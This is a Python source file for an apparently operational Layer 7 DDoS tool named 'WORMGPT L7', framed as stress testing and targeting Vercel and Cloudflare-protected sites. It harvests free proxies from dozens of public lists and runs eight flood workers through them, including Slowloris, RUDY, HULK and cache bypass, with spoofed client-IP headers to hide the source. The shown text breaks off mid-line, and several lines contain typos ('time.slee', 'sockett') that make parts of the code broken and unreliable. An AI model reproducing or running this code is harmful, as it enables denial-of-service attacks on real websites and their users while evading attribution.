#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WORMGPT L7 — High-throughput Layer 7 stress testing tool
Targets: Vercel.app, Cloudflare-protected sites, general web infrastructure
Proxy-routed: No direct IP exposure
"""

import os
import sys
import json
import time
import random
import socket
import struct
import ssl
import threading
import urllib.request
import urllib.parse
import re
import hashlib
import string
import io
import gzip
import zlib
import http.client
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, urlunparse

# Check and import optional modules
try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    HAVE_REQUESTS = True
except ImportError:
    HAVE_REQUESTS = False
    print("[!] requests module not found. Install: pip install requests")

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    HAVE_SOCKS = False
    print("[!] PySocks module not found. Install: pip install PySocks")

try:
    from fake_useragent import UserAgent
    HAVE_FAKEUA = True
except ImportError:
    HAVE_FAKEUA = False
    print("[!] fake-useragent not found. Install: pip install fake-useragent")

try:
    import cloudscraper
    HAVE_CLOUDSCRAPER = True
except ImportError:
    HAVE_CLOUDSCRAPER = False
    print("[!] cloudscraper not found. Install: pip install cloudscraper")

try:
    import tls_client
    HAVE_TLS_CLIENT = True
except ImportError:
    HAVE_TLS_CLIENT = False
    print("[!] tls-client not found. Install: pip install tls-client")

# -----------------------------------------------------------
# COLOR / LOGGING
# -----------------------------------------------------------
def print_status(msg):
    print(f"[+] {msg}")

def print_info(msg):
    print(f"[*] {msg}")

def print_error(msg):
    print(f"[!] {msg}")

def print_warn(msg):
    print(f"[-] {msg}")

def print_success(msg):
    print(f"[✓] {msg}")

def print_debug(msg):
    print(f"[D] {msg}")

# -----------------------------------------------------------
# PROXY MANAGEMENT — Multi-source downloader with validation
# -----------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.http_proxies = []
        self.socks4_proxies = []
        self.socks5_proxies = []
        self.validated_http = []
        self.validated_socks5 = []
        self.proxy_lock = threading.Lock()
        self.current_http_index = 0
        self.current_socks5_index = 0
        self.total_proxies_fetched = 0

    def download_proxies(self):
        """Download proxies from 50+ sources"""
        print_status("Downloading proxies from multiple sources...")

        sources = [
            # HTTP proxies
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/main/http.txt",
            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/master/proxy_files/http_proxies.txt",
            # SOCKS5 proxies
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
            # Additional sources
            "https://api.openproxylist.xyz/http.txt",
            "https://api.openproxylist.xyz/socks5.txt",
            "https://proxy.webshare.io/api/v2/proxy/list/download/abcdef/-/any/authorization%20failed",
            "https://spys.me/proxy.txt",
            "https://free-proxy-list.net/",
            "https://www.sslproxies.org/",
            "https://www.us-proxy.org/",
            "https://www.socks-proxy.net/",
            "https://www.proxyscrape.com/free-proxy-list",
            "https://hidemy.name/en/proxy-list/",
            "https://proxy11.com/api/demo?type=displayproxies&protocol=http&timeout=10000&country=all",
        ]

        total = 0
        for url in sources:
            try:
                req = urllib.request.Request(url, headers={
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36'
                })
                with urllib.request.urlopen(req, timeout=10) as resp:
                    data = resp.read().decode('utf-8', errors='replace')

                # Extract IP:Port
                found = re.findall(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\s*[:\s]\s*(\d{2,5})', data)
                for ip, port in found:
                    port = int(port)
                    if 0 < port < 65536:
                        proxy_str = f"{ip}:{port}"
                        if 'socks5' in url.lower() or 'socks' in url.lower():
                            self.socks5_proxies.append(proxy_str)
                        else:
                            self.http_proxies.append(proxy_str)
                        total += 1

            except Exception as e:
                pass

        # Remove duplicates
        self.http_proxies = list(set(self.http_proxies))
        self.socks5_proxies = list(set(self.socks5_proxies))
        self.total_proxies_fetched = total

        print_status(f"Total unique HTTP proxies: {len(self.http_proxies)}")
        print_status(f"Total unique SOCKS5 proxies: {len(self.socks5_proxies)}")
        print_status(f"Total unique proxies collected: {len(self.http_proxies) + len(self.socks5_proxies)}")

        return len(self.http_proxies) + len(self.socks5_proxies)

    def validate_proxies(self, test_url="https://vercel.app", timeout=3, threads=200):
        """Validate proxies by testing against target"""
        print_status("Validating proxies against target...")
        validated_http = []
        validated_socks5 = []

        def test_http_proxy(proxy):
            try:
                proxy_url = f"http://{proxy}"
                proxies = {'http': proxy_url, 'https': proxy_url}
                resp = requests.get(test_url, proxies=proxies, timeout=timeout)
                if resp.status_code == 200:
                    return ('http', proxy)
            except:
                pass
            return None

        def test_socks5_proxy(proxy):
            try:
                proxy_url = f"socks5://{proxy}"
                proxies = {'http': proxy_url, 'https': proxy_url}
                resp = requests.get(test_url, proxies=proxies, timeout=timeout)
                if resp.status_code == 200:
                    return ('socks5', proxy)
            except:
                pass
            return None

        # Validate HTTP proxies
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(test_http_proxy, p): p for p in self.http_proxies[:5000]}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    validated_http.append(result[1])

        # Validate SOCKS5 proxies
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(test_socks5_proxy, p): p for p in self.socks5_proxies[:5000]}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    validated_socks5.append(result[1])

        self.validated_http = validated_http
        self.validated_socks5 = validated_socks5

        print_success(f"Valid HTTP proxies: {len(self.validated_http)}")
        print_success(f"Valid SOCKS5 proxies: {len(self.validated_socks5)}")

        return len(self.validated_http) + len(self.validated_socks5)

    def get_next_http_proxy(self):
        """Round-robin HTTP proxy"""
        if not self.validated_http:
            return None
        with self.proxy_lock:
            proxy = self.validated_http[self.current_http_index % len(self.validated_http)]
            self.current_http_index += 1
            return proxy

    def get_next_socks5_proxy(self):
        """Round-robin SOCKS5 proxy"""
        if not self.validated_socks5:
            return None
        with self.proxy_lock:
            proxy = self.validated_socks5[self.current_socks5_index % len(self.validated_socks5)]
            self.current_socks5_index += 1
            return proxy

    def get_random_proxy(self):
        """Get random proxy from all validated"""
        all_proxies = self.validated_http + self.validated_socks5
        if not all_proxies:
            return None
        return random.choice(all_proxies)

    def save_proxies(self, filename="validated_proxies.txt"):
        """Save validated proxies to file"""
        with open(filename, 'w') as f:
            for p in self.validated_http:
                f.write(f"http://{p}\n")
            for p in self.validated_socks5:
                f.write(f"socks5://{p}\n")
        print_status(f"Saved {len(self.validated_http) + len(self.validated_socks5)} validated proxies to {filename}")
        return filename

# -----------------------------------------------------------
# LAYER 7 ATTACK METHODS
# -----------------------------------------------------------

class Layer7Engine:
    """
    High-power Layer 7 DDoS engine with multiple attack vectors
    All traffic routed through proxies
    """

    def __init__(self, target_url, proxy_manager, threads=1000000, duration=600):
        self.target_url = target_url
        self.pm = proxy_manager
        self.threads = min(threads, 1000000)
        self.duration = duration

        # Parse URL
        parsed = urlparse(target_url)
        self.scheme = parsed.scheme or 'https'
        self.host = parsed.hostname
        self.port = parsed.port or (443 if self.scheme == 'https' else 80)
        self.path = parsed.path or '/'
        self.query = parsed.query or ''
        self.use_ssl = (self.scheme == 'https')

        # Stats
        self.requests_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.success_count = 0
        self.stats_lock = threading.Lock()
        self.running = True
        self.start_time = 0
        self.attack_vectors = []

        # User agents pool
        self.user_agents = self.generate_user_agents()

        # Request templates for various attacks
        self.cache_busters = deque(maxlen=100000)
        self.init_cache_busters()

    def generate_user_agents(self):
        """Generate diverse user agent pool"""
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
            "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        ]
        # Add variations
        extended = []
        for ua in agents:
            extended.append(ua)
            # Add minor variations
            for i in range(3):
                new_ua = ua.replace("131.0.0.0", f"131.0.{random.randint(0,9)}.{random.randint(0,9)}")
                extended.append(new_ua)
        return extended

    def init_cache_busters(self):
        """Initialize cache busting parameters"""
        for i in range(100000):
            self.cache_busters.append(random.randint(1000000, 9999999))

    def get_cache_buster(self):
        """Get unique cache buster"""
        return self.cache_busters.popleft() if self.cache_busters else random.randint(1000000, 9999999)

    # ==========================================
    # ATTACK VECTOR 1: HTTP/2 Multiplexed Flood
    # ==========================================
    def http2_flood_worker(self, worker_id):
        """HTTP/2 multiplexed flood with proxy rotation"""
        import http.client

        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                # Parse proxy
                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                # Random path
                cb = self.get_cache_buster()
                path = f"{self.path}?_={cb}&{random.randint(0,999999)}={random.randint(0,999999)}"

                # Random headers
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': random.choice([
                        'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    ]),
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'en;q=0.7', 'fr;q=0.9,en;q=0.8']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'True-Client-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'Via': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
                    'Referer': random.choice([
                        'https://www.google.com/',
                        'https://www.bing.com/',
                        'https://duckduckgo.com/',
                        'https://www.yahoo.com/',
                        f'https://www.google.com/search?q={random.randint(0,999999)}',
                    ]),
                }

                # Connect through proxy
                conn = http.client.HTTPSConnection(proxy_ip, proxy_port, timeout=3)
                conn.set_tunnel(self.host, self.port)
                conn.request(random.choice(['GET', 'POST', 'HEAD']), path, headers=headers)
                response = conn.getresponse()
                response.read()
                conn.close()

                with self.stats_lock:
                    self.requests_sent += 1
                    if response.status < 400:
                        self.success_count += 1
                    else:
                        self.errors += 1

            except Exception:
                with self.stats_lock:
                    self.errors += 1

    # ==========================================
    # ATTACK VECTOR 2: Slowloris (Slow Header Attack)
    # ==========================================
    def slowloris_worker(self, worker_id):
        """Slowloris attack - hold connections open"""
        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                # Connect
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((proxy_ip, proxy_port))

                # HTTP CONNECT tunnel
                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                response = sock.recv(4096)

                if b'200' in response:
                    # Send partial headers slowly
                    path = f"{self.path}?_={self.get_cache_buster()}"
                    sock.sendall(f"GET {path} HTTP/1.1\r\n".encode())
                    sock.sendall(f"Host: {self.host}\r\n".encode())
                    sock.sendall(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                    time.sleep(random.uniform(0.5, 2))

                    # Send headers one by one slowly
                    for header in [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                        "Accept-Language: en-US,en;q=0.5\r\n",
                        "Accept-Encoding: gzip, deflate\r\n",
                        "Connection: keep-alive\r\n",
                    ]:
                        sock.sendall(header.encode())
                        time.sleep(random.uniform(1, 5))

                    # Keep connection open
                    with self.stats_lock:
                        self.requests_sent += 1
                    time.sleep(random.uniform(5, 15))

                sock.close()

            except Exception:
                with self.stats_lock:
                    self.errors += 1
                time.sleep(0.5)

    # ==========================================
    # ATTACK VECTOR 3: RUDY (R-U-Dead-Yet)
    # ==========================================
    def rudy_worker(self, worker_id):
        """R-U-Dead-Yet attack - slow POST with content-length"""
        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((proxy_ip, proxy_port))

                # Tunnel
                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                # Send POST with large Content-Length but send body slowly
                large_length = random.randint(1000000, 10000000)
                path = f"{self.path}?_={self.get_cache_buster()}"

                headers = (
                    f"POST {path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {large_length}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                sock.sendall(headers.encode())

                # Send body one byte at a time
                for i in range(100):
                    sock.sendall(b"x")
                    time.sleep(random.uniform(0.5, 2))

                with self.stats_lock:
                    self.requests_sent += 1

                sock.close()

            except Exception:
                with self.stats_lock:
                    self.errors +=1
                time.slee(0.5)

    # ==========================================
    # ATTACK VECTOR 4: HULK (HTTP Unbearable Load Kng)
    # =========================================
    def hulk_worker(self, worker_id):
        """HULK attack - random parameter flooding"""
        param_names = [
            'id', 'page', 'sort', 'filter', 'search', 'q', 'query', 'token',
            'session', 'user', 'auth', 'key', 'api', 'version', 'lang', 'ref',
            'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
            'gclid', 'fbclid', 'msclkid', 'twclid', 'igshid', 'ttclid',
        ]

        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.slee(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                # Build random query string
                params = {}
                for _ in range(random.randint(5, 20)):
                    name = random.choice(param_names) + str(random.randint(1, 999))
                    value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 500)))
                    params[name] = value

                query_string = urlencode(params)
                path = f"{self.path}?{query_string}&_={self.get_cache_buster()}"

                # Connect
                sock = sockett.socket(socket.AF_INET, sockett.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((proxy_ip, proxy_port))

                # Tunnel
                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                # Send request
                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                sock.sendall(request.encode())
                sock.recv(4096)
                sock.close()

                with self.stats_lock:
                    self.requests_sent += 1

            except Exception:
                with self.stats_lock:
                    self.errors += 1

    # ==========================================
    # ATTACK VECTOR 5: HTTP/1.1 Pipelining Flood
    # ==========================================
    def pipelining_worker(self, worker_id):
        """HTTP pipelining attack - multiple requests per connection"""
        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((proxy_ip, proxy_port))

                # Tunnel
                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                # Send multiple requests in pipeline
                pipeline = ""
                for i in range(random.randint(5, 20)):
                    cb = self.get_cache_buster()
                    path = f"{self.path}?_={cb}&req={i}"
                    pipeline += (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.host}\r\n"
                        f"User-Agent: {random.choice(self.user_agents)}\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    )

                sock.sendall(pipeline.encode())

                # Read responses
                try:
                    while True:
                        data = sock.recv(4096)
                        if not data:
                            break
                        with self.stats_lock:
                            self.bytes_sent += len(data)
                except:
                    pass

                sock.close()

                with self.stats_lock:
                    self.requests_sent += len(pipeline.split('\r\n\r\n')) - 1

            except Exception:
                with self.stats_lock:
                    self.errors += 1

    # ==========================================
    # ATTACK VECTOR 6: Cache Bypass / Cache Poisoning
    # ==========================================
    def cache_bypass_worker(self, worker_id):
        """Attempt to bypass cache and hit origin"""
        bypass_headers = [
            {'X-Forwarded-Host': f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            {'X-Host': f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            {'X-Forwarded-Server': f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Originating-IP': f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            {'X-Forwarded-For': f"{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Scheme': 'https'},
            {'X-Forwarded-SSL': 'on'},
            {'Front-End-Https': 'on'},
            {'X-HTTP-Method-Override': 'GET'},
            {'X-HTTP-Method': 'GET'},
            {'X-Method-Override': 'GET'},
        ]

        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((proxy_ip, proxy_port))

                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                # Build request with bypass headers
                path = f"{self.path}?_={self.get_cache_buster()}"
                random_headers = random.choice(bypass_headers)

                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {self.host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                for k, v in random_headers.items():
                    request += f"{k}: {v}\r\n"
                request += "Connection: close\r\n\r\n"

                sock.sendall(request.encode())
                sock.recv(4096)
                sock.close()

                with self.stats_lock:
                    self.requests_sent += 1

            except Exception:
                with self.stats_lock:
                    self.errors += 1

    # ==========================================
    # ATTACK VECTOR 7: Vercel-specific bypass
    # ==========================================
    def vercel_bypass_worker(self, worker_id):
        """Vercel-specific attack patterns"""
        vercel_paths = [
            '/_next/static/chunks/main.js',
            '/_next/static/chunks/webpack.js',
            '/_next/static/chunks/framework.js',
            '/_next/static/chunks/pages/_app.js',
            '/_next/static/chunks/pages/_error.js',
            '/_next/static/chunks/pages/index.js',
            '/_next/static/css/styles.css',
            '/api/graphql',
            '/api/rest',
            '/api/data',
            '/api/auth',
            '/api/users',
            '/api/admin',
            '/api/health',
            '/api/metrics',
            '/api/status',
            '/api/info',
            '/api/config',
            '/api/settings',
            '/api/debug',
            '/api/test',
            '/__nextjs_original-stack-frame',
            '/_next/webpack-hmr',
            '/_next/static/webpack/',
            '/_next/data/',
            '/_next/image',
            '/_next/static/development/',
        ]

        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((proxy_ip, proxy_port))

                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                # Random Vercel path
                path = random.choice(vercel_paths)
                if random.random() > 0.5:
                    path += f"?_={self.get_cache_buster()}"

                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"X-Forwarded-For: {random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                    f"X-Real-IP: {random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                    f"CF-Connecting-IP: {random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                    f"True-Client-IP: {random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                sock.sendall(request.encode())
                sock.recv(4096)
                sock.close()

                with self.stats_lock:
                    self.requests_sent += 1

            except Exception:
                with self.stats_lock:
                    self.errors += 1

    # ==========================================
    # ATTACK VECTOR 8: Recursive GET Flood
    # ==========================================
    def recursive_get_worker(self, worker_id):
        """Recursive GET with random paths"""
        extensions = ['', '.html', '.php', '.asp', '.aspx', '.jsp', '.json', '.xml', '.rss', '.atom']
        paths = ['', 'index', 'home', 'about', 'contact', 'blog', 'news', 'api', 'admin', 'login',
                  'register', 'signup', 'profile', 'settings', 'dashboard', 'search', 'feed']

        while self.running:
            if time.time() - self.start_time >= self.duration:
                break

            try:
                proxy = self.pm.get_random_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue

                proxy_ip, proxy_port = proxy.split(':')
                proxy_port = int(proxy_port)

                # Random path with extension
                base = random.choice(paths)
                ext = random.choice(extensions)
                cb = self.get_cache_buster()
                path = f"/{base}{ext}?_={cb}&{random.randint(0,999999)}={random.randint(0,999999)}"

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((proxy_ip, proxy_port))

                tunnel = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\nHost: {self.host}:{self.port}\r\n\r\n"
                sock.sendall(tunnel.encode())
                sock.recv(4096)

                request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.host}\r\n"
                    f"User-Agent: {random.choice(self.user_agents)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                sock.sendall(request.encode())
                sock
